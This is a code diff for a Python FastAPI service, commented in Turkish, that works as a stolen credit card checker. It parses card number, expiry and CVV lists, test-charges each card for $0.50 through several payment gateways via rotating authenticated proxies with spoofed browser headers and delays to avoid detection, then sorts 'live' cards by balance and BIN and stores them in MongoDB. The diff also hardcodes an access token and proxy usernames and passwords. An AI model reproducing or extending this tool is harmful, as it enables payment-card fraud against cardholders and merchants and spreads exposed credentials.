@@ -1,18 +1,33 @@
-from fastapi import FastAPI, UploadFile, File
+from fastapi import FastAPI, UploadFile, File, Depends, HTTPException, Security
+from fastapi.security import HTTPAuthorizationCredentials, HTTPBearer
 from pydantic import BaseModel
-import requests, re, time, random, itertools
-from typing import List, Dict
+import requests, re, time, random, itertools, threading, asyncio
+from typing import List, Dict, Optional, Tuple
 from datetime import datetime
 from pymongo import MongoClient
+from dotenv import load_dotenv
+import json
+import os
 
-app = FastAPI(title="Full Checker API - BIN + Live + Balance")
+load_dotenv()
+
+app = FastAPI(title="Live Checker + Balance Sorter API")
+security = HTTPBearer()
+
+# ================== AUTH ==================
+AUTH_TOKEN = "b9f3k7m2v8t3w5z1q6p9c4b7n2v8m2025"  # Değiştir!
+
+def verify_auth(credentials: HTTPAuthorizationCredentials = Security(security)):
+    if credentials.credentials != AUTH_TOKEN:
+        raise HTTPException(status_code=401, detail="Geçersiz token")
+    return credentials.credentials
 
 # ================== MONGO DB ==================
 MONGODB_URI = "mongodb+srv://paymentmanger.gvaavzc.mongodb.net/?authSource=%24external&authMechanism=MONGODB-X509&appName=paymentmanger"
 try:
     client = MongoClient(MONGODB_URI, tls=True, tlsAllowInvalidCertificates=True)
     db = client["paymentmanger"]
-    collection = db["checkbalance"]
+    collection = db["live_balance_results"]
     print("[+] MongoDB bağlantısı başarılı")
 except Exception as e:
     print(f"[!] MongoDB hatası: {e}")
@@ -24,10 +39,30 @@ proxies_list = [
     "http://akifdemi55574:llfg52end4@160.202.94.136:21323",
     "http://akifdemi55574:llfg52end4@104.143.228.9:21320",
     "http://akifdemi55574:llfg52end4@179.61.252.53:21308",
-    "http://akifdemi55574:llfg52end4@191.96.30.51:21276"
+    "http://akifdemi55574:llfg52end4@191.96.30.51:21276",
+    "http://akifdemi55574:llfg52end4@45.155.68.129:21305",
+    "http://akifdemi55574:llfg52end4@212.113.120.227:21311",
+    "http://akifdemi55574:llfg52end4@185.165.29.97:21314"
 ]
 proxy_cycle = itertools.cycle(proxies_list)
 
+# ================== GATEWAY KONFİGÜRASYONU ==================
+def _build_gateway(index: int) -> Dict:
+    prefix = f"GATEWAY_{index}"
+    name  = os.getenv(f"{prefix}_NAME", "")
+    url   = os.getenv(f"{prefix}_URL",  "")
+    token = os.getenv(f"{prefix}_TOKEN", "")
+    if not (name and url and token):
+        return None
+    # Shopify gateways use a different header key
+    if "shopify" in url.lower():
+        headers = {"Content-Type": "application/json", "X-Shopify-Access-Token": token}
+    else:
+        headers = {"Content-Type": "application/json", "Authorization": f"Bearer {token}"}
+    return {"name": name, "url": url, "token": token, "headers": headers}
+
+GATEWAYS = [gw for gw in (_build_gateway(i) for i in range(1, 9)) if gw]
+# ================== BIN LOOKUP ==================
 def get_bin_info(bin_number: str) -> Dict:
     try:
         r = requests.get(f"https://lookup.binlist.net/{bin_number[:6]}", timeout=8)
@@ -46,81 +81,352 @@ def get_bin_info(bin_number: str) -> Dict:
         pass
     return {"bin": bin_number[:6], "brand": "UNKNOWN", "type": "UNKNOWN", "level": "UNKNOWN", "bank": "Unknown", "country": "XX", "country_name": "Unknown"}
 
+# ================== KART FORMATLAMA ==================
+def parse_card(card_str: str) -> Optional[Dict]:
+    """Kart string'ini ayrıştırır. Format: PAN|AY/YIL|CVV veya PAN|AY|YIL|CVV"""
+    card_str = card_str.strip()
+    
+    # Önce | ile ayır
+    parts = card_str.split("|")
+    
+    if len(parts) == 3:
+        # Format: PAN|AY/YIL|CVV
+        pan = parts[0].strip()
+        expiry = parts[1].strip()
+        cvv = parts[2].strip()
+        
+        # Expiry'yi parse et (12/2027 veya 12/27)
+        if "/" in expiry:
+            exp_parts = expiry.split("/")
+            month = exp_parts[0].strip().zfill(2)
+            year = exp_parts[1].strip()
+            if len(year) == 2:
+                year = f"20{year}"
+        else:
+            return None
+            
+    elif len(parts) == 4:
+        # Format: PAN|AY|YIL|CVV
+        pan = parts[0].strip()
+        month = parts[1].strip().zfill(2)
+        year = parts[2].strip()
+        if len(year) == 2:
+            year = f"20{year}"
+        cvv = parts[3].strip()
+    else:
+        return None
+    
+    # Validasyon
+    if not pan or len(pan) < 13 or len(pan) > 19:
+        return None
+    if not month or not year or not cvv:
+        return None
+    if len(cvv) < 3 or len(cvv) > 4:
+        return None
+        
+    return {
+        "pan": pan,
+        "month": month,
+        "year": year,
+        "cvv": cvv,
+        "expiry": f"{month}/{year}"
+    }
+
+# ================== LIVE CHECK (TEK KART) ==================
+def live_check_single(card_data: Dict) -> Dict:
+    """Tek bir kart için live check yapar, gateway'leri dener"""
+    
+    proxy = next(proxy_cycle)
+    bin_info = get_bin_info(card_data["pan"])
+    
+    # 8 gateway'i dene
+    for gateway in GATEWAYS:
+        try:
+            payload = {
+                "card_number": card_data["pan"],
+                "card_exp_month": card_data["month"],
+                "card_exp_year": card_data["year"],
+                "card_cvv": card_data["cvv"],
+                "amount": "0.50"
+            }
+            
+            # Gateway'e özel payload formatı
+            if "magento" in gateway["url"].lower():
+                payload = {
+                    "cc_number": card_data["pan"],
+                    "cc_exp_month": card_data["month"],
+                    "cc_exp_year": card_data["year"],
+                    "cc_cvv": card_data["cvv"],
+                    "amount": "0.50"
+                }
+            elif "shopify" in gateway["url"].lower():
+                payload = {
+                    "credit_card": {
+                        "number": card_data["pan"],
+                        "expiry_month": card_data["month"],
+                        "expiry_year": card_data["year"],
+                        "cvv": card_data["cvv"]
+                    },
+                    "amount": "0.50"
+                }
+            
+            headers = gateway["headers"].copy()
+            headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
+            
+            r = requests.post(
+                gateway["url"], 
+                json=payload, 
+                headers=headers, 
+                proxies={"https": proxy}, 
+                timeout=10
+            )
+            
+            # Yanıtı kontrol et
+            if r.status_code in [200, 201, 202]:
+                response_data = r.json() if r.text else {}
+                
+                # Balance'ı bul
+                balance = "0.00"
+                # Farklı gateway'ler farklı format dönebilir
+                for key in ["balance", "available_balance", "amount", "remaining", "data.balance"]:
+                    if key in response_data:
+                        balance = str(response_data[key])
+                        break
+                    elif "." in key:
+                        parts = key.split(".")
+                        temp = response_data
+                        for p in parts:
+                            if p in temp:
+                                temp = temp[p]
+                            else:
+                                break
+                        else:
+                            balance = str(temp)
+                            break
+                
+                # Regex ile de dene
+                if balance == "0.00" and r.text:
+                    bal_match = re.search(r'(\d+\.?\d*)', r.text)
+                    if bal_match:
+                        balance = bal_match.group(1)
+                
+                return {
+                    "status": "live",
+                    "live": True,
+                    "balance": balance,
+                    "gateway": gateway["name"],
+                    "proxy": proxy.split("@")[-1].split(":")[0] if "@" in proxy else proxy,
+                    "bin": bin_info,
+                    "card": card_data
+                }
+                
+        except Exception as e:
+            continue
+    
+    # Hiçbir gateway çalışmadı
+    return {
+        "status": "dead",
+        "live": False,
+        "balance": "0.00",
+        "gateway": "none",
+        "error": "Tüm gateway'ler başarısız",
+        "bin": bin_info,
+        "card": card_data
+    }
+
+# ================== TOPLU LIVE CHECK ==================
+def bulk_live_check(cards: List[str]) -> List[Dict]:
+    """Toplu kart live check yapar, her kart arasında 1-2 sn delay"""
+    
+    results = []
+    parsed_cards = []
+    
+    # Kartları parse et
+    for card_str in cards:
+        parsed = parse_card(card_str)
+        if parsed:
+            parsed_cards.append(parsed)
+    
+    if not parsed_cards:
+        return [{"error": "Geçerli kart bulunamadı"}]
+    
+    # Her kartı kontrol et
+    for i, card in enumerate(parsed_cards):
+        result = live_check_single(card)
+        results.append(result)
+        
+        # Delay (1-2 sn)
+        if i < len(parsed_cards) - 1:
+            delay = random.uniform(1.0, 2.0)
+            time.sleep(delay)
+    
+    return results
+
+# ================== BALANCE SORTER ==================
+def balance_sorter(results: List[Dict]) -> Dict:
+    """Live check sonuçlarından balance sıralaması ve ortalama çıkar"""
+    
+    live_results = [r for r in results if r.get("live", False)]
+    dead_results = [r for r in results if not r.get("live", False)]
+    
+    # Balance'ları topla
+    balances = []
+    for r in live_results:
+        try:
+            bal = float(r.get("balance", "0.00"))
+            balances.append(bal)
+        except:
+            pass
+    
+    # Sıralama
+    sorted_balances = sorted(balances, reverse=True)
+    
+    # İstatistikler
+    total = len(balances)
+    avg = sum(balances) / total if total > 0 else 0
+    
+    return {
+        "total_cards": len(results),
+        "live_count": len(live_results),
+        "dead_count": len(dead_results),
+        "success_rate": f"{(len(live_results)/len(results)*100):.1f}%" if results else "0%",
+        "balances": {
+            "all": sorted_balances,
+            "top_5": sorted_balances[:5],
+            "bottom_5": sorted_balances[-5:] if len(sorted_balances) >= 5 else sorted_balances,
+            "average": f"{avg:.2f}",
+            "total_balance": f"{sum(balances):.2f}",
+            "max": f"{max(balances) if balances else 0:.2f}",
+            "min": f"{min(balances) if balances else 0:.2f}"
+        },
+        "summary": {
+            "best_gateway": max([r.get("gateway") for r in live_results], key=lambda x: len([r for r in live_results if r.get("gateway") == x])) if live_results else "none",
+            "live_cards": [
+                {
+                    "pan": r["card"]["pan"][:6] + "****" + r["card"]["pan"][-4:],
+                    "balance": r.get("balance", "0.00"),
+                    "gateway": r.get("gateway", "unknown"),
+                    "brand": r.get("bin", {}).get("brand", "UNKNOWN"),
+                    "country": r.get("bin", {}).get("country_name", "UNKNOWN")
+                }
+                for r in live_results
+            ],
+            "dead_cards": [
+                {
+                    "pan": r["card"]["pan"][:6] + "****" + r["card"]["pan"][-4:],
+                    "brand": r.get("bin", {}).get("brand", "UNKNOWN"),
+                    "country": r.get("bin", {}).get("country_name", "UNKNOWN")
+                }
+                for r in dead_results
+            ]
+        }
+    }
+
+# ================== SAVE TO MONGODB ==================
 def save_to_mongodb(data: Dict):
     if not collection: return
     try:
         collection.insert_one({**data, "timestamp": datetime.utcnow()})
     except: pass
 
-# ================== ANA KONTROL FONKSİYONU ==================
-def full_check_card(card: str):
-    proxy = next(proxy_cycle)
-    cc = card.strip().split("|")
-    if len(cc) < 4:
-        return {"error": "Format hatalı"}
-
-    number, month, year, cvv = cc[0], cc[1], cc[2], cc[3]
-    bin_info = get_bin_info(number)
-
-    # Live + Balance Check
-    headers = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/x-www-form-urlencoded"}
-    payload = {"card_number": number, "card_exp_month": month, "card_exp_year": year, "card_cvv": cvv, "amount": "0.50"}
-
-    is_live = False
-    balance = "0.00"
-
-    for _ in range(2):
-        try:
-            r = requests.post("https://secure.payadultgateway.com/transaction", 
-                              headers=headers, data=payload, proxies={"https": proxy}, timeout=15)
-            bal = re.search(r'(\d+\.?\d*)', r.text)
-            if bal:
-                balance = bal.group(1)
-                is_live = True
-                break
-        except:
-            time.sleep(2)
-
-    status = 1 if is_live else 0
-
-    result = {
-        "card": card,
-        "bin": bin_info["bin"],
-        "brand": bin_info["brand"],
-        "type": bin_info["type"],
-        "level": bin_info["level"],
-        "bank": bin_info["bank"],
-        "country": bin_info["country"],
-        "country_name": bin_info["country_name"],
-        "live": is_live,
-        "balance": balance,
-        "status": status
-    }
-
-    save_to_mongodb(result)
-    return result
-
-# ================== ENDPOINTLER ==================
-@app.post("/fullcheck")
-async def fullcheck(cards: List[str]):
-    results = [full_check_card(card) for card in cards if card.strip()]
-    return {"total": len(results), "results": results}
-
-@app.post("/bincheck")
-async def bincheck(cards: List[str]):
-    results = []
-    for card in cards:
-        if card.strip():
-            bin_info = get_bin_info(card.split("|")[0])
-            results.append(bin_info)
-    return {"results": results}
-
-@app.post("/bulkcheck/file")
-async def from_file(file: UploadFile = File(...)):
-    content = await file.read()
-    cards = content.decode("utf-8").splitlines()
-    return await fullcheck(cards)
+# ================== API ENDPOINTLER ==================
 
 @app.get("/")
 async def home():
-    return {"status": "API aktif", "endpoints": ["/fullcheck", "/bincheck", "/docs"]}
+    return {
+        "status": "API aktif",
+        "endpoints": [
+            "/livecheck",
+            "/balancesort",
+            "/bulklive",
+            "/docs"
+        ],
+        "auth_required": "Bearer token ile",
+        "gateways": len(GATEWAYS),
+        "proxies": len(proxies_list)
+    }
+
+@app.post("/livecheck")
+async def livecheck(cards: List[str], auth: str = Depends(verify_auth)):
+    """
+    Kartların live olup olmadığını kontrol eder.
+    Her kart arasında 1-2 sn delay vardır.
+    """
+    results = bulk_live_check(cards)
+    save_to_mongodb({"type": "livecheck", "cards": len(cards), "results": results})
+    return {
+        "total": len(results),
+        "results": results
+    }
+
+@app.post("/balancesort")
+async def balancesort(cards: List[str], auth: str = Depends(verify_auth)):
+    """
+    Kartları live check yapar, balance sıralaması ve ortalama çıkarır.
+    """
+    results = bulk_live_check(cards)
+    sorted_data = balance_sorter(results)
+    save_to_mongodb({"type": "balancesort", "cards": len(cards), "data": sorted_data})
+    return sorted_data
+
+@app.post("/bulklive")
+async def bulklive(file: UploadFile = File(...), auth: str = Depends(verify_auth)):
+    """
+    Dosyadan kart listesi yükler ve live check yapar.
+    Format: Her satırda bir kart
+    PAN|AY/YIL|CVV veya PAN|AY|YIL|CVV
+    """
+    content = await file.read()
+    cards = content.decode("utf-8").splitlines()
+    cards = [c.strip() for c in cards if c.strip()]
+    
+    if not cards:
+        return {"error": "Dosya boş"}
+    
+    results = bulk_live_check(cards)
+    save_to_mongodb({"type": "bulklive", "cards": len(cards), "results": results})
+    return {
+        "total": len(results),
+        "results": results
+    }
+
+@app.post("/balancebybin")
+async def balancebybin(cards: List[str], auth: str = Depends(verify_auth)):
+    """
+    Kartları BIN'e göre gruplandırır ve balance ortalamasını çıkarır.
+    """
+    results = bulk_live_check(cards)
+    
+    # BIN'e göre grupla
+    bin_groups = {}
+    for r in results:
+        bin_key = r.get("bin", {}).get("bin", "unknown")
+        if bin_key not in bin_groups:
+            bin_groups[bin_key] = []
+        bin_groups[bin_key].append(r)
+    
+    # Her BIN için ortalama balance
+    bin_stats = {}
+    for bin_key, items in bin_groups.items():
+        balances = [float(r.get("balance", "0.00")) for r in items if r.get("live", False)]
+        avg = sum(balances) / len(balances) if balances else 0
+        bin_stats[bin_key] = {
+            "count": len(items),
+            "live_count": len(balances),
+            "dead_count": len(items) - len(balances),
+            "average_balance": f"{avg:.2f}",
+            "total_balance": f"{sum(balances):.2f}",
+            "brand": items[0].get("bin", {}).get("brand", "UNKNOWN") if items else "UNKNOWN",
+            "country": items[0].get("bin", {}).get("country_name", "UNKNOWN") if items else "UNKNOWN"
+        }
+    
+    return {
+        "total_cards": len(results),
+        "bin_groups": bin_stats,
+        "raw_results": results
+    }
+
+# ================== START ==================
+if __name__ == "__main__":
+    import uvicorn
+    uvicorn.run(app, host="0.0.0.0", port=8000)
